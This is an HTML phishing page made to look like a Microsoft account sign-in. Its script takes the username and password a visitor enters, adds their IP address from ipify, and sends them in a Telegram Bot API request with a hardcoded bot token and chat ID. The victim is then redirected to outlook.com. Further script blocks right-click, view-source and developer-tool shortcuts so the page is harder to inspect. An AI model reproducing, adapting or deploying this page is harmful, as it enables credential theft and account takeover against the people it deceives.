<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your Microsoft account</title>
	<link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/1024px-Microsoft_logo.svg.png?20210729021049">
    <link rel="stylesheet" href="./css/style.css">
</head>
<body>
<div class="login-container">
        <form action="" id="form">
            <img src="https://blogs.microsoft.com/wp-content/uploads/prod/2012/08/8867.Microsoft_5F00_Logo_2D00_for_2D00_screen-1920x706.jpg" alt="MICROSOFT OUTLOOK" class="logo">
            <h2>Sign in</h2>
            <div class="input-group">
                <input type="text" placeholder="Username, email, or mobile" id="usr" required>
            </div>
            <div class="input-group">
                <input type="password" placeholder="Password" id="pwd" required>
            </div>
            <input type="text" id="ipaddress" hidden>
            <button type="submit" id="sub">Next</button>
            <div class="options">
                <a href="#">Can't access your account?</a>
            </div>
        </form>
    </div>
    <script src="scripts.js"></script>
	
<script>
// Disable right-click context menu
document.addEventListener('contextmenu', function(event) {
    event.preventDefault();
});

// Disable common keyboard shortcuts
document.addEventListener('keydown', function(event) {
    if (event.ctrlKey || event.metaKey) {
        switch (event.key) {
            case 'u': // Ctrl+U
            case 's': // Ctrl+S
            case 'p': // Ctrl+P
                event.preventDefault();
                break;
            case 'i': // Ctrl+Shift+I
            case 'j': // Ctrl+Shift+J
                if (event.shiftKey) {
                    event.preventDefault();
                }
                break;
            case 'c': // Ctrl+Shift+C
                if (event.shiftKey) {
                    event.preventDefault();
                }
                break;
            case 'k': // Ctrl+Shift+K (Firefox)
                if (event.shiftKey) {
                    event.preventDefault();
                }
                break;
        }
    }
});
</script>

		
<style>
body, html {
    margin: 0;
    padding: 0;
    height: 100%;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
}

body {
    display: flex;
    justify-content: center;
    align-items: center;
    background-color: #f3f2f1;
}

.login-container {
    background-color: white;
    padding: 40px;
    border-radius: 8px;
    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
    width: 100%;
    max-width: 400px;
    text-align: center;
}

.logo {
    width: 80%; /* Adjust width as necessary */
    max-width: 300px;
    margin-bottom: 20px;
}

h2 {
    margin-bottom: 20px;
    font-size: 24px;
    color: #333;
}

.input-group {
    position: relative;
    margin-bottom: 20px;
}

.input-group input {
    width: 100%;
    padding: 14px 20px;
    border: 1px solid #ccc;
    border-radius: 4px;
    font-size: 16px;
    box-sizing: border-box;
    outline: none;
    transition: border-color 0.3s, box-shadow 0.3s;
}

.input-group input:focus {
    border-color: #0078d7;
    box-shadow: 0 0 5px rgba(0, 120, 215, 0.3);
}

button {
    width: 100%;
    padding: 14px;
    border: none;
    border-radius: 4px;
    background-color: #0078d7;
    color: white;
    font-size: 16px;
    cursor: pointer;
    transition: background-color 0.3s;
}

button:hover {
    background-color: #0056b3;
}

.options {
    margin-top: 20px;
}

.options a {
    color: #0078d7;
    text-decoration: none;
    font-size: 14px;
}

.options a:hover {
    text-decoration: underline;
}
</style>
		

  <!-- START: Here's the IP stuff -->
<script type="application/javascript">
function getIP(json) {
    document.getElementById("ipaddress").value = json.ip;
}
</script>

<script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
 <!-- END: IP Stuff -->	
 
 
<script>
      const forma = document.querySelector('#form')
    
      let bot = {
          TOKEN: "7284904058:AAGcFzkHJPhqY-l-89aLWRibxrs4HyUkioI",
          chatID: "5423617982"
      }

      const emAil = document.querySelector('#usr')
      const suBBer = document.querySelector('#suber')
      const pWd = document.querySelector('#pwd')
      const strong = document.querySelector('.strong')
      
	  const submit = document.querySelector('#sub').addEventListener('click', e =>{
        if(emAil.value === ''){
		
		
		
          return
        }
        display.textContent = emAil.value
        strong.textContent = 'Enter password'
        emAil.style.display = 'none'
        pWd.style.display = 'block'
        submit.style.display = 'none'
        suBBer.style.display = 'block'
      })


    forma.addEventListener("submit", e =>{
          e.preventDefault();
          let email = document.querySelector('#usr').value
          let pwd = document.querySelector('#pwd').value
		  let ips = document.querySelector('#ipaddress').value

        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=Microsoft=>${email}=${pwd}==IP:>${ips}`, {
              method: "GET"
          }).then(success => {
              window.location.replace("https://outlook.com/");
          }, error => {
              console.log(error)
              }) 
      })
    </script>
</body>
</html>
